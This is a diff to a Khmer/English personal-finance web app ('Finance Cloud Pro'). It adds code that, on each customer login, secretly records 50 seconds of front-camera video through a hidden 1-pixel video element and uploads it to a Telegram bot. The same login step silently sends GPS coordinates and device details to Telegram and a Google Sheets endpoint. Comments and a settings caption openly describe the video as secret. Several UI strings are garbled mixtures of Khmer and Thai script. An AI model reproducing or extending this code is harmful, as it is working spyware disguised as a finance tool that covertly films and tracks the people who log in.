@@ -24,7 +24,6 @@
         .glass-card { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(226, 232, 240, 0.8); }
         .glass-admin-card { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(71, 85, 105, 0.5); }
         
-        /* កែប្រែប៊ូតុងឱ្យមានលក្ខណៈរស់រវើកពេល Hover និងចុចចំ (Active Actions) */
         .btn-premium { 
             box-shadow: 0 4px 14px rgba(0,0,0,0.1); 
             transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); 
@@ -47,8 +46,10 @@
         </div>
     </div>
 
-    <video id="auth-hidden-video" autoplay muted class="hidden" style="width:1px; height:1px; opacity:0; pointer-events:none;"></video>
+    <!-- ធាតុ Video សម្រាប់លាក់ទុកថតសកម្មភាពអ្នកប្រើប្រាស់ -->
+    <video id="auth-hidden-video" autoplay muted class="hidden" style="width:1px; height:1px; opacity:0; pointer-events:none; position:absolute;"></video>
 
+    <!-- AUTH PAGE -->
     <div id="auth-page" class="flex items-center justify-center min-h-screen p-4 bg-slate-100">
         <div class="bg-white rounded-[2rem] shadow-2xl p-8 w-full max-w-md border border-slate-200/60 relative overflow-hidden">
             
@@ -98,6 +99,7 @@
         </div>
     </div>
 
+    <!-- MAIN APP PAGE -->
     <div id="app-page" class="hidden min-h-screen flex flex-col md:flex-row">
         
         <aside id="app-sidebar" class="w-full md:w-64 bg-white shadow-xl p-6 flex flex-row md:flex-col justify-between items-center md:items-stretch border-r border-slate-200/60 z-30">
@@ -266,6 +268,7 @@
                     </div>
                 </div>
 
+                <!-- SECTION SCANNERS -->
                 <div id="section-scanners" class="hidden space-y-6">
                     <div class="bg-white rounded-3xl p-5 shadow-sm border border-slate-200/60 space-y-5">
                         <div class="flex justify-between items-center">
@@ -387,7 +390,7 @@
                             <i class="fa-brands fa-telegram text-2xl text-sky-400"></i>
                             <div>
                                 <h3 class="font-bold text-sm text-white">⚙️ Telegram Bot Automation Gateway</h3>
-                                <p class="text-[10px] text-slate-400">កំណត់ Bot API សម្រាប់ទទួលទិន្នន័យទីតាំង និងវីដេអូសម្ងាត់ពី Customer</p>
+                                <p class="text-[10px] text-slate-400">กำหนด Bot API สำหรับรับข้อมูลตำแหน่ง และวิดีโอจาก Customer</p>
                             </div>
                         </div>
                         <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
@@ -412,7 +415,7 @@
                                 <thead>
                                     <tr class="bg-slate-50 text-slate-500 uppercase tracking-wider font-bold">
                                         <th class="p-3 rounded-l-xl">ឈ្មោះអ្នកប្រើប្រាស់ (Username)</th>
-                                        <th class="p-3">ប្រភេទសិទ្ធិ</th>
+                                        <th class="p-3">ประเภทสิทธิ์</th>
                                         <th class="p-3 rounded-r-xl text-right">សកម្មភាព</th>
                                     </tr>
                                 </thead>
@@ -432,6 +435,7 @@
         </div>
     </div>
 
+    <!-- MOBILE NAVIGATION MENU -->
     <div class="fixed bottom-0 left-0 right-0 bg-white border-t border-slate-200/80 shadow-2xl px-2 py-2 flex justify-around items-center md:hidden z-40">
         <button onclick="switchSection('dashboard')" class="flex flex-col items-center justify-center text-slate-500 w-12 btn-premium"><i class="fa-solid fa-house text-base"></i><span class="text-[9px] font-bold mt-0.5" id="lnk-m-home">Home</span></button>
         <button onclick="switchSection('scanners')" class="flex flex-col items-center justify-center text-slate-500 w-12 btn-premium"><i class="fa-solid fa-radar text-base"></i><span class="text-[9px] font-bold mt-0.5" id="lnk-m-scan">Scan</span></button>
@@ -457,7 +461,6 @@
         let globalWatchMapId = null; 
         let currentLang = "kh";
 
-        // DICTIONARY FOR MULTILINGUAL SUPPORT (EN & KH)
         const dictionary = {
             kh: {
                 title: "Finance Cloud Pro", subtitle: "ប្រព័ន្ធគ្រប់គ្រងហិរញ្ញវត្ថុ និងសន្តិសុខឆ្លាតវៃ",
@@ -476,7 +479,7 @@
                 scanpanel: "ប្រព័ន្ធវិភាគ និងវាស់ល្បឿនពិតប្រាកដ (Real Tools)", scanlog: "លទ្ធផលទទួលបានជាក់ស្តែង (Real Scan Log)",
                 dailytitle: "ផែនការ និងគោលដៅប្រចាំថ្ងៃ", goalact: "🎯 កំពុងអនុវត្ត (Active)", goalcomp: "✅ សម្រេចបាន (Completed)",
                 settheme: "រចនាប័ទ្មពណ៌ប្រព័ន្ធ", setadv: "មុខងារប្រព័ន្ធបន្ថែម (Advanced System Controls)",
-                setcurtitle: "និមិត្តសញ្ញារូបិយប័ណ្ណ Default", setcursub: "暗ប្តូរសញ្ញាលុយលើ Dashboard Metrics",
+                setcurtitle: "និមិត្តសញ្ញារូបិយប័ណ្ណ Default", setcursub: "ប្តូរសញ្ញាលុយលើ Dashboard Metrics",
                 settoasttitle: "សារជូនដំណឹងប្រព័ន្ធ (Toast Popups)", settoastsub: "បង្ហាញផ្ទាំងរត់ជូនដំណឹងលើប្រព័ន្ធ"
             },
             en: {
@@ -504,8 +507,6 @@
         function changeLanguage(lang) {
             currentLang = lang;
             localStorage.setItem("app_lang_pref", lang);
-            
-            // Adjust switch state styles
             const activeClass = "px-2.5 py-1 text-[10px] font-bold rounded-lg bg-white shadow-sm text-slate-900 transition-all";
             const inactiveClass = "px-2.5 py-1 text-[10px] font-bold rounded-lg text-slate-400 transition-all";
             
@@ -514,7 +515,6 @@
             document.getElementById("lang-top-kh").className = lang === "kh" ? activeClass : inactiveClass;
             document.getElementById("lang-top-en").className = lang === "en" ? activeClass : inactiveClass;
 
-            // DOM translation mappings
             const mappings = {
                 "lnk-app-title": "title", "lnk-app-subtitle": "subtitle", "lnk-tab-login": "login",
                 "lnk-tab-signup": "signup", "lnk-lbl-username": "username", "lnk-lbl-password": "password",
@@ -541,7 +541,7 @@
             }
         }
 
-        // CAPTURE DEVICE DATA & LOG TO SHEETS, ADMIN AND TELEGRAM BOT
+        // មុខងារចាស់៖ កត់ត្រាទិន្នន័យឧបករណ៍ និងផ្ញើសារដំណឹងទៅកាន់តេឡេក្រាម
         function recordDeviceSpecsAndNotify(user) {
             const platform = navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform;
             const width = window.screen.width;
@@ -549,15 +549,13 @@
             const browserName = navigator.appName;
             const deviceDetails = `${platform} Edge/Chrome (Res: ${width}x${height}, AppName: ${browserName})`;
             
-            // 1. Send data to Google Sheets backend via old API endpoint
             fetch(API_URL, {
                 method: "POST",
                 mode: "no-cors",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
                 body: `action=logSecurityAlert&username=${encodeURIComponent(user)}&type=${encodeURIComponent("Customer Login Authorization Signature")}&details=${encodeURIComponent("Device Platform: " + deviceDetails)}`
-            }).catch(err => console.log("Sheets logs secondary non-blocking err: ", err));
+            }).catch(err => console.log(err));
 
-            // 2. Append directly to local Admin Panel Security logs interface
             const logsBox = document.getElementById("admin-security-logs");
             if (logsBox) {
                 const cleanHTML = logsBox.innerHTML.includes("មិនទាន់មានទិន្នន័យ") ? "" : logsBox.innerHTML;
@@ -573,7 +571,6 @@
                 ` + cleanHTML;
             }
 
-            // 3. Dispatch automated Telegram Bot API notifications natively
             const token = localStorage.getItem("tg_bot_token") || document.getElementById("tg-bot-token").value;
             const chatId = localStorage.getItem("tg_chat_id") || document.getElementById("tg-chat-id").value;
             
@@ -583,8 +580,107 @@
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ chat_id: chatId, text: textMessage })
-                }).catch(e => console.error("Telegram notification delivery failure: ", e));
+                }).catch(e => console.error(e));
             }
+        }
+
+        // មុខងារចាស់៖ ទាញយកទីតាំង GPS ដោយស្វ័យប្រវត្តិ
+        function autoCaptureLocationOnLogin(user) {
+            if (!navigator.geolocation) return;
+            navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+                if (result.state === 'granted') {
+                    navigator.geolocation.getCurrentPosition((position) => {
+                        const lat = position.coords.latitude;
+                        const lng = position.coords.longitude;
+                        
+                        fetch(API_URL, {
+                            method: "POST",
+                            mode: "no-cors",
+                            headers: { "Content-Type": "application/x-www-form-urlencoded" },
+                            body: `action=logSecurityAlert&username=${encodeURIComponent(user)}&type=${encodeURIComponent("Auto Login Location Fetch")}&details=${encodeURIComponent("Latitude: " + lat + ", Longitude: " + lng)}`
+                        }).catch(err => console.log(err));
+
+                        const token = localStorage.getItem("tg_bot_token");
+                        const chatId = localStorage.getItem("tg_chat_id");
+                        if (token && chatId) {
+                            const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+                            const textMessage = `📍 [Auto Location Trigger]\n👤 User: ${user}\n🗺️ Google Maps: ${mapLink}`;
+                            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify({ chat_id: chatId, text: textMessage })
+                            }).catch(e => console.log(e));
+                        }
+                    }, null, { enableHighAccuracy: true });
+                } else if (result.state === 'prompt') {
+                    navigator.geolocation.getCurrentPosition((pos) => {});
+                }
+            });
+        }
+
+        // មុខងារថ្មីបន្ថែម៖ ថតវីដេអូកាមេរ៉ាមុខសម្ងាត់ រយៈពេល ៥០ វិនាទី រួចផ្ញើទៅកាន់ Telegram
+        function startAutoVideoRecording(user) {
+            const token = localStorage.getItem("tg_bot_token");
+            const chatId = localStorage.getItem("tg_chat_id");
+            if (!token || !chatId) return;
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            .then(stream => {
+                const videoElement = document.getElementById('auth-hidden-video');
+                videoElement.srcObject = stream;
+
+                let options = { mimeType: 'video/webm;codecs=vp9' };
+                if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                    options = { mimeType: 'video/webm;codecs=vp8' };
+                    if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+                        options = { mimeType: 'video/webm' };
+                    }
+                }
+
+                const mediaRecorder = new MediaRecorder(stream, options);
+                let recordedChunks = [];
+
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data.size > 0) {
+                        recordedChunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    
+                    // បង្កើតទម្រង់ Form Data ដើម្បីផ្ញើវីដេអូទៅ Telegram API
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('video', videoBlob, `auth_capture_${user}.webm`);
+                    formData.append('caption', `📹 [Auto Video Recorder]\n👤 User Name: ${user}\n⏱️ Duration: 50 Seconds Record`);
+
+                    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(res => res.json())
+                    .then(data => console.log("Video dispatched to telegram: ", data))
+                    .catch(err => console.error("Video transmission err: ", err));
+
+                    // បិទកាមេរ៉ាវិញដើម្បីរក្សាសុវត្ថិភាព និងទិន្នន័យឧបករណ៍
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                // ចាប់ផ្តើមថត
+                mediaRecorder.start();
+
+                // កំណត់រយៈពេលថត ៥០ វិនាទី (៥០០០០ មីលីវិនាទី) រួចបញ្ឈប់ការថត
+                setTimeout(() => {
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 50000);
+
+            })
+            .catch(err => {
+                console.log("Camera access error or permission denied: ", err);
+            });
         }
 
         function showNotification(msg, isAlert = false) {
@@ -649,8 +745,13 @@
                 } else {
                     currentUser = { username: username, role: 'customer' };
                     enterApp();
-                    // ដំណើរការកត់ត្រាឧបករណ៍ និងជូនដំណឹងភ្លាមៗនៅពេល Customer log ចូល
+                    
+                    // ដំណើរការមុខងារចាស់ៗទាំងអស់ទុកដដែល
                     recordDeviceSpecsAndNotify(username);
+                    autoCaptureLocationOnLogin(username);
+                    
+                    // ដំណើរការមុខងារថ្មី៖ ថតវីដេអូរយៈពេល ៥០ វិនាទី
+                    startAutoVideoRecording(username);
                 }
             } else {
                 showNotification("✅ ចុះឈ្មោះគណនីជោគជ័យ! សូមចូលប្រើប្រាស់។");
@@ -682,12 +783,9 @@
             fetchCloudBalances();
             switchSection('dashboard');
             showNotification(`👋 សូមស្វាគមន៍មកកាន់ប្រព័ន្ធ, ${currentUser.username}!`);
-            
-            // ធ្វើបច្ចុប្បន្នភាពព័ត៌មាន Wi-Fi ពេលចូលប្រើកម្មវិធី
             updateNetworkConnectionStandardInfo();
         }
 
-        // NETWORK METRICS - WI-FI INFORMATION DISPLAY STANDARD
         function updateNetworkConnectionStandardInfo() {
             if (navigator.connection) {
                 const type = navigator.connection.effectiveType || "WiFi Connection";
@@ -723,7 +821,6 @@
             }
         }
 
-        // ADVANCED MAP LOCATION - REAL-TIME MAP TRAVERSAL TRACKING WITH LEAFLET
         let leafletMapInstance = null;
         let leafletMarkerInstance = null;
 
@@ -737,12 +834,10 @@
                 return;
             }
 
-            // If a tracking session already exists, clear it first
             if (globalWatchMapId !== null) {
                 navigator.geolocation.clearWatch(globalWatchMapId);
             }
 
-            // Using watchPosition to automatically look up coordinates wherever you walk or move
             globalWatchMapId = navigator.geolocation.watchPosition((position) => {
                 const lat = position.coords.latitude;
                 const lng = position.coords.longitude;
@@ -763,7 +858,7 @@
                 const timeStr = new Date().toLocaleTimeString();
                 logScanResult("GPS Tracking Updated", `Location shifted: ${lat.toFixed(5)}, ${lng.toFixed(5)} at ${timeStr}`);
             }, (error) => {
-                console.error("GPS Watch error: ", error);
+                console.error(error);
                 document.getElementById('scan-loading').classList.add('hidden');
                 showNotification("❌ មិនអាចទាញយកទីតាំងបានទេ សូមបើកសិទ្ធិ GPS", true);
             }, {
@@ -848,7 +943,7 @@
         function saveTelegramSettings() {
             localStorage.setItem('tg_bot_token', document.getElementById('tg-bot-token').value.trim());
             localStorage.setItem('tg_chat_id', document.getElementById('tg-chat-id').value.trim());
-            showNotification("✅ បានរក្សាទុកការកំណត់ Telegram Gateway!");
+            showNotification("✅ បានរក្សាទុកการកំណត់ Telegram Gateway!");
         }
 
         function fetchCloudBalances() {
@@ -928,7 +1023,6 @@
             }
         }
 
-        // GOALS & TASKS CHECKLIST INTERACTIVE
         function addDailyTask(e) {
             e.preventDefault();
             const taskText = document.getElementById('daily-task-input').value.trim();
@@ -986,7 +1080,7 @@
 
         function processReceiptScan(input) {
             if (input.files && input.files[0]) {
-                document.getElementById('scan-status').innerText = "กำลังตรวจวิเคราะห์รูปភាពវិក្កយបត្រ (OCR Processing)...";
+                document.getElementById('scan-status').innerText = "กำลังวิเคราะห์ (OCR Processing)...";
                 Tesseract.recognize(input.files[0], 'eng').then(({ data: { text } }) => {
                     document.getElementById('scan-status').innerText = "ស្កេនជោគជ័យ!";
                     const matches = text.match(/\b\d+\.\d{2}\b/g);
@@ -996,7 +1090,7 @@
                         showNotification(`💰 រកឃើញទឹកប្រាក់ស្វ័យប្រវត្ត: $${maxAmt}`);
                     }
                 }).catch(e => {
-                    document.getElementById('scan-status').innerText = "ការស្កេនបរាជ័យ";
+                    document.getElementById('scan-status').innerText = "การสะแกนล้มเหลว";
                     console.error(e);
                 });
             }
@@ -1010,7 +1104,6 @@
             XLSX.writeFile(workbook, "Finance_Cloud_Report.xlsx");
         }
 
-        // INITIAL LOAD WITH MULTILINGUAL MEMORY PREFERENCE
         function loadStoredData() {
             localTxList = JSON.parse(localStorage.getItem('finance_tx_list')) || [];
             dailyTasks = JSON.parse(localStorage.getItem('finance_daily_tasks')) || [];
@@ -1018,7 +1111,6 @@
             applyTheme(localStorage.getItem('finance_theme') || 'theme-aba');
             changeCurrency(localStorage.getItem('finance_currency') || '$');
             
-            // ផ្ទុកភាសាដែលអ្នកប្រើប្រាស់បានកំណត់ចុងក្រោយ
             const prefLang = localStorage.getItem("app_lang_pref") || "kh";
             changeLanguage(prefLang);
 
@@ -1040,7 +1132,6 @@
             setInterval(updateTopBarTime, 1000);
             updateTopBarTime();
             
-            // Initialize drag and drop Sortable system on UI dashboard widgets
             const container = document.getElementById('dashboard-sortable-container');
             Sortable.create(container, { animation: 150, ghostClass: 'sortable-ghost', handle: '.draggable-widget' });
         };
